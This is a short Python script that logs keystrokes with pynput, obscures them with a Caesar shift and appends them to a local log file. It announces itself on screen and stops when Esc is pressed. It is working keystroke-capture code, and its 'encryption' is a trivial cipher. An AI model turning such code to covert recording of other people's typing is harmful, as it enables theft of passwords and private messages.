from pynput import keyboard
import time
import threading
import os
import random

# --- Path setup: always next to this script ---
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(SCRIPT_DIR, "keystrokes.log")
KEY_FILE = os.path.join(SCRIPT_DIR, "key.txt")

# Generate a fresh key for this session and store it
SHIFT = random.randint(1, 25)
with open(KEY_FILE, "w") as f:
    f.write(str(SHIFT))
print(f"Session key: {SHIFT} (saved to {KEY_FILE})")

FLUSH_SECONDS = 15

buffer = []

def encrypt(text, shift):
    result = ""
    for char in text.upper():
        if char.isalpha():
            result += chr((ord(char) - 65 + shift) % 26 + 65)
        else:
            result += char
    return result

def flush():
    """Runs on a timer: encrypt whatever is in the buffer and append to file."""
    global buffer
    if buffer:
        text = "".join(buffer)
        encrypted = encrypt(text, SHIFT)
        with open(LOG_FILE, "a") as f:
            f.write(encrypted + "\n")
        buffer = []
    timer = threading.Timer(FLUSH_SECONDS, flush)
    timer.daemon = True
    timer.start()

def key_to_char(key):
    """Turn a pynput key event into readable text for the buffer."""
    try:
        return key.char
    except AttributeError:
        special = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "[TAB]",
        }
        return special.get(key, "")

def on_press(key):
    char = key_to_char(key)
    if char:
        buffer.append(char)
    if key == keyboard.Key.esc:
        return False

print("Capturing keys (encrypted every {}s). Press Esc to stop.".format(FLUSH_SECONDS))
flush()  # start the timer cycle
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
flush()  # one final flush so nothing typed at the end is lost
print("Stopped. Encrypted log saved to", LOG_FILE)